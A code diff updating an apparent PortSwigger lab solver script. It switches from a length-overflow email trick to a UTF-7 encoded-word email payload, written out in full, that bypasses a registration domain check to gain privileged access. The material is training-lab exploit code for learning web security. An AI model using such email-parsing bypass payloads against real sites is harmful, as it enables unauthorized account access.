@@ -1,12 +1,12 @@
 ##################################################################################
 #
-# Lab: Inconsistent handling of exceptional input
+# Lab: Bypassing access controls using email address parsing discrepancies
 #
 # Hack Steps: 
 #      1. Fetch the register page
 #      2. Extract the csrf token and session cookie to register a new account
-#      3. Register a new account with a suitable offset and dontwannacry.com 
-#         before the real domain
+#      3. Register a new account with your email embedded in encoded-word format 
+#         to bypass email address parsing
 #      4. Fetch the email client
 #      5. Extract the link of account registration
 #      6. Complete the account registration by following the link
@@ -20,8 +20,8 @@ import requests
 import re
 from colorama import Fore
 
-LAB_URL = "https://0af70075049f2d80832b069300ab0017.web-security-academy.net" # Change this to your lab URL
-EXPLOIT_DOMAIN = "exploit-0ad0009104462d3483800592012500a3.exploit-server.net" # Change this to your exploit DOMAIN
+LAB_URL = "https://0af200f2045c207fd6f320e4005100c2.web-security-academy.net" # Change this to your lab URL
+EXPLOIT_DOMAIN = "exploit-0a310081043e20d0d63d1f500107004d.exploit-server.net" # Change this to your exploit DOMAIN
 NEW_USERNAME = "attacker"; # You can change this to what you want
 NEW_PASSWORD = "hacking"; # You can change this to what you want
 
@@ -37,13 +37,13 @@ def main():
     csrf = re.findall("csrf.+value=\"(.+)\"", register_page.text)[0]
 
     print(Fore.GREEN + "OK")
-    print(Fore.WHITE + "⦗3⦘ Registering a new account with a suitable offset and dontwannacry.com before the real domain.. ", end="", flush=True)
+    print(Fore.WHITE + "⦗3⦘ Registering a new account with your email embedded in encoded-word format to bypass email address parsing.. ", end="", flush=True)
 
-    offset = "a" * 238
-    malicious_email = f"{offset}@dontwannacry.com.{EXPLOIT_DOMAIN}"
+    malicious_email = f"=?utf-7?q?attacker&AEA-{EXPLOIT_DOMAIN}&ACA-?=@ginandjuice.shop"
     cookies = { "session": session }
     data = { "username": NEW_USERNAME, "password": NEW_PASSWORD, "csrf": csrf, "email": malicious_email }
     post_data(f"{LAB_URL}/register", data, cookies)
+
 
     print(Fore.GREEN + "OK")
     print(Fore.WHITE + "⦗4⦘ Fetching the email client.. ", end="", flush=True)
